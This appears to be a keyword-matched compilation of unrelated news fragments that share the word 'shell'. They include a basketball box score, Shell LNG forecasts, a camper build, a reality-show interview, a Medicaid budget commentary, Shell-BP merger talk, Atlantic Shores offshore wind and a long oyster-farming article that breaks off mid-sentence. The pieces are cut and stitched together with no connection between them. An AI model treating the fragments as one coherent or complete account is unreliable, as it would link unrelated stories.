Saints finished 13-of-26 from deep.\n\nSydney Bienemann led Waverly-Shell Rock with 18.\n\nXAVIER 67, WAVERLY-SHELL ROCK 50\n\nWaverly-Shell Rock (50): Lizzy Frazell 3-7 2-2 10, Brittney Bodensteiner 5-9 2-2 12, Sydney Bienemann 5-11 8-10 18, Addie Kruse 3-7 0-3 6, Megan Heyer 0-3 2-4 2, Anaka Ott 1-3 0-0 2, Addie Ott 0-0 0-0 0, Emma Smith 0-1 0-0 0.

            "content": "\n\nWorldwide demand for liquefied natural gas will increase by about 60% in the next decade and a half, thanks to economic expansion, emissions-cutting efforts and the growth of artificial intelligence, Shell said this week (Reuters).\n\n\n\nWhat\u2019s going on: \u201cDemand for natural gas continues to rise globally as the world transitions to cleaner fuels. Industry forecasts LNG demand to reach between 630 million and 718 million metric tons a year by 2040, Shell said in its 2025 annual LNG outlook.\u201d\n\nThe numbers are higher than last year\u2019s forecast, which put LNG demand at anywhere from 625 million tons to 685 million tons a year by 2040.\n\nWhere it will go: \u201cUpgraded forecasts show that the world will need more gas for power generation, heating and cooling, industry and transport to meet development and decarbonization goals,\u201d said Shell Senior Vice President of LNG Marketing and Trading Tom Summers.\n\n\n\nIndia: India\u2019s natural gas consumption is set to rise by about 60% from 2023 to 2030, according to the International Energy Agency.\n\nTo meet the growing appetite, the country is increasing LNG import capacity and building out related infrastructure.\n\nDelays: LNG endeavors \u201chave seen delays over the past two years due to geopolitical tensions, regulatory hurdles, labor shortages and supply chain bottlenecks, delaying the availability of around 30 million tons of new LNG supply, the size of India\u2019s LNG imports, to 2028.\u201d\n\n\n\nUnleashing U.S. energy potential: However, President Trump\u2019s lifting of the previous administration\u2019s LNG export permit ban \u201ccould pave the way for almost 100 million metric tons per annum of additional LNG by 2031,\u201d according to another Reuters (subscription) piece.",

To combat this problem, [Ed\u2019s Garage] built a camper shell that extends once you\u2019ve arrived at your campsite.\n\n[Ed] wanted to keep things relatively low profile while still tall enough to sit up in for convenience, leading to a small bit of the shell peeking over the truck\u2019s roof. To keep the cold Canadian winter out, attention was paid to proper weather sealing around the sliding portion of the shell so that it stays warm and dry inside.\n\nWhile this would work on any truck, the mains power plugs in the bed of some modern trucks mean that certain glamping conveniences like a heater and projector can be easily powered while you\u2019re in camp. We get to see the camper shell in action at the end of the video where the pros and cons of having your sleeping space also being your storage while en route become apparent.\n\nIf you\u2019re looking for something a little less conventional for your camping experience, how about this solar camper or this retro bike camper?",

            "content": "Everyone loved La Shell Wooten on Deal or No Deal Island. So why is she no longer playing? La Shell\u2019s stellar social game seemed to fail her when Parvati Shallow put her up against the Banker, and then she was eliminated after making a bad deal.\n\nBut was La Shell ready to go? In her final words, she noted that \"It's probably going to be a little more of a vicious game than I want to be a part of.\" Vicious indeed. Was La Shell content to leave the game? What does she make of the big Parvati and Phillip Solomon split? Where does she stand on the controversial Courtney \"CK\" Kim? And would she have actually booted Dickson Wong had she beaten the Banker? We asked the 55-year-old social worker all that and more.\n\nLa Shell Wooten on 'Deal or No Deal Island'. Monty Brinton/NBC\n\nENTERTAINMENT WEEKLY: I had multiple people tell me how good your social game was. So what happened?\n\nLA SHELL WOOTEN: I know my social game was great. My Temple game was\u2026 I needed some help. I feel like every time you go into Temple, it is a really strong game of luck and a little bit of calculation. And so in this round it was only between me and Dickson. It was just the two of us who could have been put up. I think if there was a third person to be put up, I don't think I would have been, but I was, and I played my game.\n\nWhen I came into this game, I thought to myself, \"There's only going to be one winner and I hope it's me, but I want to have fun along the way.\" And when I got to Temple this last episode and I had to play, I felt a little discombobulated. I really wanted to believe I wasn't going to play, but I think I did good. And ultimately, if I couldn't win, I definitely wanted to leave on my own terms and I also wanted to leave contributing a significant amount of money.\n\nSeychelle Cordero and La Shell Wooten on 'Deal or No Deal island'. Monty Brinton/NBC\n\nYeah, Joe asked the question \"What's more important, safety or money?\" It's really the question every player faces against the Banker. It seems like your answer was money and you were just trying to build the pot up a little more, even if was for someone else. Is that accurate?\n\nIt is, because I really play the game of karma. I think the way that chips fall, you have nothing to do with, but I wanted to contribute what I could because I hope that that same kind of energy comes to me in other situations and settings. So that felt good to me.\n\nWhy did Parvati put you up against the Banker instead of Dickson?\n\nHonestly, I think she was in a tough spot. She promised to keep me safe, but she also played her entire game as Dickson's mom, and there were only a few people left. I don't know if she was calculating what would it look like if she went back to camp and she had put up Dickson herself, what would her other alliances think about her? And so I just think she made a decision. I also think she had a lot of faith in my positivity, taking me a long way \u2014 and Dickson's a little bit more of a nervous character than I am. I don't think it was an easy choice to make. I really wish there was at least one more person that she had to choose from, but that's not how it played out.\n\nLa Shell Wooten, Parvati Shallow, and David Genat on 'Deal or No Deal Island'. Monty Brinton/NBC\n\nYou said after your elimination that \"It's probably going to be a little more of a vicious game than I want to be a part of.\" What was it like dealing with that aspect of the game, and was there part of you that was like, \"Maybe going out now is okay before this gets to the next level\"?\n\nDealing with people's alliances and backstabbing and lying and being vicious \u2014 perfectly fine. I'm a therapist, a coach, a social worker. I deal with sort of the worst things in people's lives, so I was fine with it. I didn't want to get to a point where I had to become quite vicious to stay alive. I wanted to continue to play the game the way that I did, which is really off of my own sort of intuition and social skills, which took me very far. I didn't feel like I wouldn't be able to handle it going any further, but at the same time, in my mind I was like, \"Well, if this is where it ends, I can go have fun with the other exiled people and then see how it all turns out.\"\n\nWhy did you back out and let David and Parvati go over the gorge and get the last two cases in the excursion?\n\nI definitely was not doing it! Listen, when I got on this show, I was constantly focused on meeting each challenge where it was. And I knew the one thing that was a difficulty for me is heights. Everything else I could kind of get around and could talk myself through. And it had already been through two height challenges with the hammock and jumping for the ring.\n\nAnd then with the sound of the water\u2026 Because in my mind I thought, \"This is going to be like a zipline.\" I could do that. But then I realized as I was reading the description, I'm like, \"I think I'm going to have to pull my own body weight.\" And not a Survivor is La Shell, so I thought, \"This is where you check out,\" because I didn't want to end up in an ambulance or being medevaced somewhere.\n\nLa Shell Wooten and Parvati Shallow on 'Deal or No Deal Island'. Monty Brinton/NBC\n\nWould you have eliminated Dickson had you beaten the Banker?\n\nNo.\n\nReally?\n\nNo, I wouldn't. Dickson and I had a conversation before when we knew one of us was going and we agreed we wouldn't take each other out. But I told Parvati that because I wanted to kind of influence her decision to let him take his chances and control his own destiny. So no, I would not have taken Dickson out.\n\nWhom would you have taken out?\n\nI would've taken out Lete. The reason I would've taken out Lete is because at this point in the game, I'm looking at the physicality. I feel like David and Parvati were super-strong, not only because they had won Survivor \u2014 and I didn't even know that about David at that point \u2014 but physically, him, Lete, Phillip, to me were big challenges, and the only people eligible to go were Lete, Phillip, CK, and Dickson. To me, physically, she was the biggest threat in the pile. She's tall, she's won almost every challenge. She has luck on her side. For me to go further, it would've been smart for me to take her out.\n\nSo Parvati and Phillip were super-close and then they weren\u2019t. What did you make of what happened there?\n\nI really didn't believe the super-closeness at all. I did believe that Phillip was playing that game. He knew Parvati was from Survivor. He understood she had skills, and I think it was smart for him to buddy up with her when she was kind of calling him into her lair. But I never really believed that she had his back the way that she said. I didn't believe she had anybody's back. And that was even before I knew she played on Survivor.\n\nBut I could see it come apart very easily because Parvati will do whatever she needs to and say whatever she needs to. And Phillip is really a bit more rooted in integrity, even in the game. So when he hears things like that, and I've seen him do it with other people in the cast, he's like, \"Oh no, I'll play with you, but I got my eye on you.\" And he got upset enough that he confronted her directly, which I thought, good for you.\n\nLa Shell Wooten on 'Deal or No Deal Island'. Monty Brinton/NBC\n\nCK was really rooting for you to beat the Banker, but some others were not too fond of her out there. What was your take on CK in the game?\n\nI really love her. CK and I were together as we were traveling to the island. We were seated with each other, so she was the first person I got to meet. But what I learned about CK through the game, her goal was to get all women to the end. That's number one. I don't think people knew that. Which is the reason I think she took the Captain's Safety in the challenge where she had all the guys on her side. She'd stay safe, and all the women were on the other side and we were all safe.\n\nBut she is a very intense player and she's a strategist. Her mind is always going and she gets very emotional about what she needs to see happen, and I was really there to kind of balance that out for her. But she shielded me all the way through. I mean, I was in the bottom almost the whole game, and I was literally almost never on anyone's radar, and largely that was because of a lot of what she was doing behind the scenes with players that she was strategizing with and forming alliances with. So I'm grateful for her. I really loved her as a player.\n\nYou basically applied for the show because you were curious about how a reality show application worked and just thought answering the application questions would be fun. Did you end up having fun on the show?\n\nI really had way more fun than I thought. I went through all the stages of grief, right? I kind of accidentally applied. Then I figured out along the way, \"Wait, you might actually end up on the show.\" Then I went into a panic about actually having to do what we were there to do. And then when I got there and started meeting the cast and worked on how to center myself to face the challenges, I had a ball. I had a great time. I would do it again.\n\nSign up for Entertainment Weekly's free daily newsletter to get breaking news, exclusive first looks, recaps, reviews, interviews with your favorite stars, and more.",

            "content": "There\u2019s no shortage of controversies surrounding the House Republicans\u2019 far-right budget plan, but at the top of the list is what the party has in store for Medicaid. It\u2019s easy to understand why: GOP officials seem to realize that it\u2019s not a great look for Republicans to cut taxes for the wealthy while simultaneously taking health care benefits from low-income families.\n\nParty leaders have gone out of their way to claim that the House GOP budget blueprint does not include Medicaid cuts. In fact, they said, it doesn\u2019t even mention the health care program at all.\n\n\u201cIt doesn\u2019t even mention Medicaid in the bill,\u201d House Speaker Mike Johnson told reporters. \u201cThe word \u2018Medicaid\u2019 is not even in this bill,\u201d House Majority Leader Steve Scalise added. \u201cThis bill doesn\u2019t even mention the word \u2018Medicaid\u2019 a single time.\u201d\n\nIt\u2019s not nearly that simple. As The New York Times reported:\n\nThe budget resolution itself is silent on whether Congress cuts Medicaid, which provides health coverage to 72 million poor and disabled Americans. But it instructs the House Energy and Commerce Committee, which has jurisdiction over the program, to cut spending by $880 billion over the next decade.\n\nIn other words, the House Republicans\u2019 budget plan doesn\u2019t literally cut Medicaid, it simply directs the House committee that oversees Medicaid to find deep cuts that can only be found in Medicaid.\n\nIndeed, some GOP members have been willing to acknowledge publicly what is plainly true. Republican Rep. Russ Fulcher of Idaho, for example, who sits on the Energy and Commerce Committee, recently told The Hill, \u201cThere\u2019s only one place you can go, and that\u2019s Medicaid. That\u2019s where the money is. There\u2019s others, don\u2019t get me wrong, but if you\u2019re gonna get to $900 billion, something has to be reformed on the Medicaid front.\u201d\n\nI\u2019m mindful of the larger partisan circumstances. Donald Trump, for example, vowed on Fox News last week that Medicaid would go untouched during his presidency. Around the same time, Republican Sen. Josh Hawley of Missouri said, \u201cI don\u2019t like the idea of massive Medicaid cuts.\u201d\n\nSimilarly, media personality Steve Bannon warned GOP officials a week earlier, \u201cMedicaid, you gotta be careful. Because a lot of MAGAs are on Medicaid, I\u2019m telling you. If you don\u2019t think so, you are dead wrong.\u201d\n\nWith this in mind, there\u2019s no great mystery as to why House Republicans are playing a shell game with their budget plan, but that doesn\u2019t make their deceptive claims true.\n\nWhat\u2019s more, it\u2019s important to emphasize just how much damage the GOP blueprint, if implemented, would do to the program. We\u2019re talking about a plan that would cut $880 billion over the next decade, which is more than just a little trim. Even if Republicans were to impose new work restrictions on Medicaid recipients, that would (a) represent a cut of its own; and (b) produce savings of roughly $100 billion over 10 years according to the Congressional Budget Office. The remaining cuts would necessarily have to include additional cuts to health care benefits for struggling families.\n\nIf you went through the Republicans\u2019 budget plan line by line, it\u2019s true that you wouldn\u2019t find references to Medicaid cuts \u2014 but that doesn\u2019t mean they\u2019re not there.",

            "content": "The oil/energy industry is witnessing a wave of consolidation as energy giants seek to strengthen their market position amid changing dynamics. The latest speculation about a possible merger between Shell plc SHEL and BP plc BP has reignited discussions about mega-mergers, drawing comparisons to ExxonMobil\u2019s XOM acquisition of Pioneer Natural Resources and Chevron Corporation\u2019s CVX deal with Hess Corporation HES.\n\nAll the companies mentioned above currently have a Zacks Rank #3 (Hold). You can see the complete list of today\u2019s Zacks #1 Rank (Strong Buy) stocks here.\n\nShell-BP Merger: A European Energy Titan in the Making?\n\nRumors of a Shell-BP merger have surfaced again, with industry insiders debating whether such a deal is feasible or a mere speculation. The proposed merger would create a combined entity with a market capitalization of around $300 billion, potentially rivaling ExxonMobil ($480 billion) and Chevron ($282 billion). Proponents argue that consolidation would bring operational efficiencies, stronger financial resilience, and a more competitive edge against U.S. oil majors, especially given the valuation gap between European and American energy firms.\n\nHowever, significant hurdles remain. Antitrust regulators could challenge such a deal, given concerns about reduced competition. Additionally, Shell\u2019s leadership has downplayed the likelihood of large acquisitions, signaling a focus on organic growth rather than major buyouts. BP\u2019s poor stock performance and investor frustration, highlighted by activist investor Elliott Investment Management\u2019s stake in the company, could urge it to explore strategic options, including a merger.\n\nIndustry-Wide Consolidation: Lessons From Exxon-Pioneer and Chevron-Hess Mergers\n\nBeyond Shell and BP, major oil companies are already pursuing transformative deals. ExxonMobil\u2019s $59.5 billion acquisition of Pioneer Natural Resources solidifies its dominance in the Permian Basin, while Chevron\u2019s $53 billion deal for Hess strengthens its portfolio, particularly in Guyana\u2019s offshore oil fields. These mergers reflect a broader strategy among energy majors to secure high-quality reserves, streamline operations and position themselves for long-term profitability.\n\nFor ExxonMobil and Chevron, acquiring smaller players ensures greater control over production costs, enhances capital efficiency and mitigates risks associated with volatile oil prices. In contrast, European majors like Shell and BP face additional pressure from stricter climate policies and lower valuations on the London Stock Exchange, raising questions about their ability to compete with U.S. peers in a rapidly evolving market.",

The venture was developing the 2.8-GW Atlantic Shores 1 and 2 projects offshore New Jersey.\n\nOn Atlantic Shores\u2019 website, the project responded to Shell\u2019s exit with a Jan. 30 statement that said, \u201cWhile we can\u2019t comment on the views of shareholders, Atlantic Shores intends to continue progressing New Jersey\u2019s first offshore wind project and our portfolio in compliance with our obligations to local, state and federal partners under existing leases and relevant permits.\u201d\n\nHowever, the New Jersey Board of Public Utilities responded to Shell\u2019s decision by canceling the state\u2019s fourth offshore wind solicitation earlier this month.\n\n\u201cA number of reasons led to this decision, notably Shell backing out as an equity partner in the Atlantic Shores project and backing away from the American clean energy market, as well as uncertainty driven by federal actions and permitting,\u201d NJBPU President Christine Guhl-Sadovy said in a Feb. 3 release. \u201cThe Board concluded that an award in New Jersey's fourth offshore wind solicitation, despite the manifold benefits the industry offers to the state, would not be a responsible decision at this time.\u201d\n\nAfter EDF\u2019s writedown of its own stake, the project\u2019s fate is left unclear. The 1.5-GW Atlantic Shores 1 had received a construction and operations plan approval from the Bureau of Ocean Energy Management in October, and completion was slated for 2028.\n\nEDF said \u201cunfavourable changes in the political situation in the United States, Shell\u2019s announcement of its withdrawal from the joint venture, and the decision by the State of New Jersey \u2026. to cancel the tender for which ASOW had bid its most advanced project\u201d led the company to make the decision to book an impairment of 934 million euro, or $980 million.",

Photo: Monty Brinton/NBC\n\nSure, La Shell had no enemies in the game, but she also lacked anyone with her best interests in mind. La Shell's fate was ultimately determined by the strength of a different alliance: The Family, made up of the covert \"Golden God\" of Survivor: Australia, David Genat, Survivor and Traitors star Parvati Shallow, and their Banker's Island \"son,\" Dickson Wong.\n\nRob chastized La Shell for being so forthright with Parvati about her frontrunner status. As a fellow Survivor titan, Rob is well-versed in Parvati's unbridled willingness to eliminate players who've deemed her a threat. After admitting she'd never seen Survivor to understand Parvati's reality TV prowess, La Shell explained that she saw Parvati as an intellectual threat more than anything. Considering Parvati was responsible for dealing the final blow to La Shell's game, Rob's point may hold.\n\nRELATED: Why Parvati Shallow Avoided \"Arrogant\" Dr. Will on Deal or No Deal Island\n\nDuring the deliberations over who'd play the Deal or No Deal game, La Shell had asked Parvati not to make her face the Banker. But knowing she was infamous for going back on her word, La Shell wasn't exactly shocked when Parvati prioritized keeping her island son Dickson safe over her. With no eager participants emerging, Parvati had to force someone to face the Banker and ultimately refused to stab her son in the back.\n\nLa Shell Wooten and Parvati Shallow appear on Deal or No Deal Island Season 2 Episode 1 \"The Banker Strikes Back\".

Rob was genuinely rooting for La Shell, so after watching her make an ill-fated call so close to the end, he has his fingers crossed for La Shell's return to Bankers Island someday.\n\n\"I'd love to see you play again,\" Rob told her.\n\n\"I'd love to see me play again, too,\" La Shell quipped right back.\n\nWatch Deal or No Deal Island After Show with Boston Rob on Peacock, NBC's YouTube, and NBC.com every Wednesday following new episodes of Deal or No Deal Island Season 2, which air Tuesdays at 9/8c on NBC.",

            "content": "Credits Aryn Baker is a Rome-based foreign correspondent who has spent the past 25 years writing about the intersection of climate change, conflict, migration, science, culture and politics around the world.\n\nLA SPEZIA, Italy \u2014 One recent January afternoon, Paolo Varrella, an Italian mussel farmer with a penchant for big gambles, inspected a crateload of recently harvested oysters. He plucked one from the pile, wedged the tip of his pocketknife under the hinge, and with a slight twist and a horizontal swipe of the blade, popped open the shell to reveal the green-fringed oyster inside. He tipped the sweet, briny contents of the shell into his mouth. \u201cPerfetto,\u201d he declared and grinned, as if he had just won the jackpot.\n\nIn a way, he had. His hometown of La Spezia, on Italy\u2019s Ligurian coast, is famous for mussel cultivation. But around two decades ago, Varrella broke with tradition to try his hand at oyster farming, resurrecting an industry that had been dormant for around a century. For years, Varrella\u2019s quixotic sideline in oysters was a source of good-natured ribbing among La Spezia\u2019s mussel farmers \u2014 why compete with France\u2019s dominance in the oyster market when Italian mussels already offered a solid business model?\n\nBut when water temperatures spiked in the early 2020s due to climate change, the population of a local fish that preys on mussels exploded, wiping out 95% of the mussel harvest. The oysters were left unscathed. His colleague\u2019s oyster jibes evolved into heartfelt appreciation for Varrella\u2019s prescient bet. Without the oysters, the La Spezia shellfish cooperative would not have survived, Varella said.\n\nThese days, mussels are back in La Spezia, but oysters are also now a key pillar of the local aquaculture economy, a necessary diversification for an industry made increasingly unpredictable by climate change.\n\nVarrella\u2019s oysters, with their deeply cupped shells and blue-green gills prized by Michelin-starred chefs, aren\u2019t just a culinary product that could put La Spezia on the map; they are one of the rare, farmed products that contribute more to nature than they detract. One oyster can filter up to 50 gallons of ocean water a day, removing pollution and debris. Oysters naturally build reefs that foster biodiversity and protect surrounding habitats from erosion. Farming them requires no fertilizers, feed or antibiotics; they sequester carbon as they grow. For those keeping an eye on their carbon footprint, they are a tasty, guilt-free source of protein and nutrients. \u201cOysters are the perfect food,\u201d Varrella told me, with the zeal of a new convert. \u201cEveryone should be growing oysters. Or at least eating them.\u201d\n\nIf they did, oyster farming could help communities adapt to some of the worst impacts of climate change on our planet while cleaning up oceans and contributing a vital food source for a growing global population. But they, too, are threatened by the combination of warming waters, opportunistic disease and ocean acidification that also threaten La Spezia\u2019s mussels. Varrella\u2019s oysters may have withstood La Spezia\u2019s most recent marine heat wave, but they may not survive the next. Scientists are now in a race against time to develop so-called \u201cclimate-proof\u201d oysters that can withstand the multiple threats compounded by global warming. Oysters could help humans better adapt to climate change, but only if humans help them adapt first.\n\nThe Sea Made Solid\n\nLike sharks and nautiluses, oysters are living fossils, their anatomy relatively unchanged in their 190 to 250 million years on this planet. When dinosaurs walked the earth, oysters dominated the oceans, sculpting the marine environment with massive reefs built on the remains of their predecessors. Excavations of ancient settlements indicate that Stone Age humans relied on oysters and other shellfish for survival, and some scientists postulate that this increase of omega-3 fatty acids in their diet helped with brain growth and the development of tools, culture and religion.\n\nSome archaeologists hypothesize that the abundance of shellfish along the coast helped guide human migration over the North American land bridge and into the Americas. That bounty sustained human populations for millennia. In the mid-1800s, New Yorkers ate an average of 600 oysters a year, dredged from reefs so big they appeared on nautical charts. European appetites were equally voracious \u2014 and destructive. By the end of the century, wild oyster reefs had all but disappeared from the globe, having fallen victim to over-harvesting and industrial pollution. Scientists now estimate that today\u2019s global oyster population is a mere fraction of historic numbers.\n\nOur hunger for oysters has changed the geography of our coasts, denuding them of natural wave breaks and making them more vulnerable to sea level rise, storm surges and erosion. Had the great expanse of oyster reefs that historically protected New York Harbor south of Staten Island remained in place, instead of dredged to feed a growing population throughout the 1800s, damage from 2012\u2019s Hurricane Sandy wouldn\u2019t have been nearly as bad, said Sally McGee, who manages the Shellfish Growers Climate Coalition within the environmental nonprofit, The Nature Conservancy.\n\n\u201cOysters could help humans better adapt to climate change, but only if humans help them adapt first.\u201d\n\nGroups like The Nature Conservancy are working to restore oyster reefs worldwide, from New York to Louisiana, Australia and the United Kingdom. Not for food \u2014 that would defeat the purpose \u2014 but for their other, more environmental, services. In New York City, the Billion Oyster Project has set a goal to restore 100 acres of oyster reefs by 2035.\n\nIn most cases, \u201crestoring\u201d means starting over. The Billion Oyster Project uses a small structure made of oyster-friendly substrate, \u201cseeding\u201d it with oyster larvae. The spat \u2014 young oysters \u2014 excrete a concrete-like substance to anchor themselves to the structure for life. Once mature, an oyster spawns every summer, releasing millions of gametes into surrounding waters and producing the next generation of larvae that will, in turn, settle on other shells, eventually building into house-sized reefs.\n\nOysters are so prolific, estimated one researcher, that if half of a female oyster\u2019s offspring were to develop into female oysters, it would take less than five generations to repopulate the world\u2019s oyster beds. However, rising water temperatures and increasing ocean acidity caused by climate change mean that few larvae survive in the wild, and the nascent reefs set up by oyster restoration efforts must be reseeded annually with hatchery spat to continue growing \u2014 a kind of IVF for the bivalve set.\n\nSince its founding in 2014, the Billion Oyster Project has midwifed 150 million oysters into existence, creating a total of 19 acres of new reef across multiple locations in New York Harbor. New advances in oyster propagation are speeding up the process, and Carolyn Khoury, the program\u2019s director of restoration, told me she is confident they will reach their goal. She said the cost of restoring the reefs is not much different from installing sea walls or other protective measures. However, as living, self-repairing systems, they are a more robust alternative to traditional construction.\n\n\u201cOyster reefs are what we refer to as a nature-based solution for climate resilience,\u201d Khoury told me. \u201cWhen paired with wetland restoration, they can improve shoreline resilience to wave energy, increased storm frequency and erosion caused by climate change.\u201d\n\nThey also provide more ecosystem services than a concrete wave barrier. Oyster reefs may not be as pretty as their coral cousins, but they are a vital habitat for spawning fish and other marine organisms. As they grow, they convert the water\u2019s dissolved calcium and carbon into their shells, which sequester about 12 grams of carbon per oyster. The larvae that don\u2019t survive end up as a meal for everyone else.\n\nAn oyster reef is like a giant Brita filter for the ocean, removing pollutants and purifying the water around them. They are \u201cThe Giving Tree\u201d of the underwater world. \u201cEverybody wants the pill for fixing climate change. Oysters are probably as close as you are going to get,\u201d said Dan Martino, who wrote \u201cThe Oyster Book,\u201d a history of the bivalve. \u201cI can\u2019t think of a single drawback to growing them.\u201d\n\nMartino is another recent convert to the oyster cult. Like Varrella, he started farming oysters relatively recently, around a decade ago in Martha\u2019s Vineyard. He saw them as a solution to a looming global food crisis. Conventional land-based agriculture will not be able to meet the needs of a growing global population, he said, especially as droughts, heat and extreme weather push crops to their limits, while intensive animal farming adds to the carbon emissions causing climate change. The ocean provides an alternative. But farming fish, like farming beef and chicken, requires vast amounts of feed \u2014 usually other fish \u2014 also creates pollution, and typically requires antibiotics and other medicines to treat outbreaks of parasites and disease.\n\nBivalves don\u2019t need anything. They feed on plankton filtered from the water. Fertilizers are unnecessary, and they don\u2019t contribute significantly more carbon into the atmosphere. \u201cThey\u2019re the most sustainable species we could farm on Earth,\u201d Martino said. Marine conservation societies agree, rating farmed shellfish as the best choice for consumers, noting that they encourage marine biodiversity.\n\nAnd they are much healthier to eat. Most bivalves have more protein than beef and are rich in omega-3 fatty acids, iron, zinc, iodine, magnesium, calcium and phosphorous. Oyster aficionados describe them as \u201cthe sea made solid.\u201d Martino told me they are more like superfoods on the half shell: Just six oysters a day provide 100% of many of a person\u2019s major nutritional requirements. \u201cFarming oysters can meet our growing food demands while bettering our ecosystem, our environment, and our health,\u201d Martino said.\n\n\u201cOyster reefs are what we refer to as a nature-based solution for climate resilience \u2026 They can improve shoreline resilience to wave energy, increased storm frequency and erosion.\u201d \u2014 Carolyn Khoury\n\nErnest Hemingway sought out oysters to help assuage his depression, writing in \u201cA Moveable Feast\u201d that when he was eating oysters, \u201cwith their strong taste of the sea and their faint metallic taste that the cold white wine washed away, leaving only the sea taste and the succulent texture \u2026 I lost the empty feeling and began to be happy and to make plans.\u201d\n\nThese days, they are one of the rare treats that are both good for you and the planet. That double halo of nutrition and sustainability is driving sales: Global oyster production increased from 1.3 million tons in 1990 to 7.5 million tons in 2024 and is expected to reach 8.9 million tons by 2033, according to industry analysts. Demand continues to outpace supply. Martino said he could double production at his oyster ranch and still sell out. Rising water temperatures and increased ocean acidity caused by climate change are most likely the largest threat to the $8.5 billion-a-year industry, marine biologists who specialize in oyster aquaculture told me.\n\nSand In The Oyster Shell\n\nTim Green, a professor of fisheries and aquaculture at Vancouver Island University in Canada, has been studying oysters since 2008, when a mysterious disease all but decimated France\u2019s oyster crop. From France, Ostreid herpesvirus 1 (OsHV-1), or oyster herpes, hitchhiked across the world\u2019s shipping lanes on cargo carriers, ravaging New Zealand\u2019s oyster farms, then Australia\u2019s. In 2018, it led to mass die-offs in San Diego. \u201cIt doesn\u2019t affect humans, but for oyster farmers, it\u2019s devastating,\u201d Green told me. \u201cOstreid herpesvirus can wipe out a farm in four days. We are talking 90% mortality.\u201d\n\nMeanwhile, something else is stalking oysters in the Pacific Northwest, which produces more than a quarter of America\u2019s oysters. Farmers have reported mass die-offs for several years, usually just before the summer harvest. Summer oyster mortality, as Green and other scientists call it, could be caused by a virus similar to oyster herpes or an as-of-yet-unidentified bacteria. What Green does know is that marine heat waves \u2014 a period of unusually high ocean temperatures that can be caused by changes in ocean currents, weather events or climate patterns \u2014 trigger outbreaks of both diseases. \u201cAn elevated temperature is key,\u201d he said. \u201cMaybe the virus was always there, ticking along quietly, killing an oyster every once in a while, and then all of a sudden, boom, it gets hot, the oysters are stressed, and the virus kicks into overdrive.\u201d\n\nScientists at the United Nations\u2019 Intergovernmental Panel on Climate Change found that the number of marine heatwave events \u2014 in which temperatures increase 2 degrees Celsius to 5 degrees Celsius (3.6 to 9 degrees Fahrenheit) relative to historic temperatures \u2014 have doubled around the world since the 1980s, and predict that the frequency, duration, scale and intensity of future marine heatwaves will continue to increase with global warming.\n\nGreen isn\u2019t sure if warmer waters help the pathogens proliferate or if the heat waves stress the oysters, making them more vulnerable to disease. Either way, heat can be deadly, and it\u2019s getting worse. Heat waves in the Pacific Northwest used to be rare. Now, they sometimes happen several times a year. \u201cIt\u2019s a ticking time bomb,\u201d Green said.\n\nDetonation isn\u2019t far off, Green and other ocean scientists believe. A new study published by the United Kingdom\u2019s University of Reading found that the world\u2019s oceans are warming more than four times faster than they were 40 years ago. In the late 1980s, ocean warming was akin to adding a trickle of hot water to a full bathtub. Now it\u2019s more like opening the hot water tap on full blast, Christopher Merchant, the study\u2019s lead author, explained in a briefing for journalists. That already has enormous ramifications for ocean health \u2014 impacting everything from coral reefs to storm severity \u2014 but the study\u2019s prediction that rising temperatures will continue to accelerate \u201cby a significant margin,\u201d over the next 20 years, as Merchant wrote in the study\u2019s introduction, will fundamentally alter life underwater. The Reading professor of ocean and Earth observation elaborated in the university\u2019s briefing: \u201cThe way to slow down that warming is to start closing off the hot tap, by cutting global carbon emissions and moving towards net-zero.\u201d\n\nThose carbon emissions don\u2019t just drive up temperatures; they also increase ocean acidity. If you\u2019ve ever dropped an egg in vinegar, you know what happens next. Oyster shells are made mostly of calcium carbonate, which starts to dissolve in an acidic environment. Mature oysters with thick shells can tolerate \u2014 to a certain extent \u2014 increased acidity, but in such an environment, juvenile larvae can\u2019t grow strong shells fast enough (or in extremely acidic environments, any shells at all), making them vulnerable to predators and disease. \u201cWe\u2019re getting to the point where, throughout the entire summer, it\u2019s no longer favorable for a little oyster to make its shell,\u201d in certain parts of the Pacific Northwest, Green told me.\n\n\u201cFarming oysters can meet our growing food demands while bettering our ecosystem, our environment, and our health.\u201d \u2014 Dan Martino\n\nThe hatcheries that provide larvae to oyster farmers found a workaround by keeping their juveniles in tanks of specially buffered water until they could grow thick enough shells to survive in the wild. Harvests improved in some cases, at least for a while. However, Green and other researchers have documented another alarming die-off among this new, coddled generation. Green suspects that raising the larvae in temperature and pH-controlled tanks reduces their resilience in other ways. \u201cYou can protect against one stress,\u201d he said. \u201cBut how does that influence them down the line when this oyster suddenly gets exposed to elevated temperature and a disease at the same time?\u201d\n\nGreen and his team are working on future-proofing the industry by selectively breeding to create stronger oysters. So far, he told me, they have developed a more heat-tolerant strain and another resistant to ocean acidification. They are now working on disease resistance against oyster herpes, norovirus and vibrio, he said. Unlike oyster herpes, which is harmless to humans, eating oysters infected with norovirus or some kinds of vibrio bacteria can make humans sick. Strict regulations on water testing in commercial fisheries mean such infections are rare, he noted. \u201cThe big trick now is combining all that to make a super oyster,\u201d Green said.\n\nIt\u2019s not the first time scientists have intervened to make a more resilient oyster. In the late 1970s, researchers selectively bred a strain of oysters that, like seedless watermelons, had three sets of chromosomes instead of two. The triploid mutation made the oyster sterile. Researchers found that when oysters spend all their energy on growth and repair instead of reproduction, the result is a tastier, faster-growing and more resilient product. \u201cThis is what\u2019s called triploid vigor,\u201d said Matt George, a marine biologist specializing in bivalves and now the coastal shellfish manager for the Washington Department of Fish and Wildlife.\n\nSterility has a market advantage. The old exhortation to only eat oysters during months with an \u201cr\u201d in their name \u2014 September through April \u2014 derives from the fact that oysters spawn in the summer. Just before spawning, they are gamey with gametes. Just after, they are flaccid and watery. Triploid oysters are meaty and sweet all year round. They can also be harvested sooner \u2014 after a year or two (or sometimes even sooner) instead of the three years or so needed for diploids to grow to market size \u2014 reducing the chance they will be felled by disease.\n\nBy the 2010s, the market advantages of triploid oysters had converted half of the West Coast\u2019s commercial farmers, most of the East Coast\u2019s, and nearly all of Europe\u2019s. Demand for oysters on the half shell now peaks in summer, when they are best appreciated on a bed of ice served alongside a chilled ros\u00e9.\n\nBut a funny thing happened on the way to the raw bar. In 2021, an unprecedented heatwave hit the Pacific Northwest, killing at least 619 people and cooking some billion bivalves \u2014 oysters, mussels and clams \u2014 in their shells. George, the oyster specialist, had been researching triploid vigor at the time and seized the opportunity to conduct a study on heat tolerance. \u201cOur original hypothesis was that triploidy would make oysters more climate-proof, that sterility would boost their available energy and ability to deal with large-scale climate events like this,\u201d he said.\n\nThe hypothesis was wrong. George and his team found that triploid oysters were nearly 2.5 times more likely to die than diploids when exposed to heat stress. That\u2019s terrible news for an industry that has grown 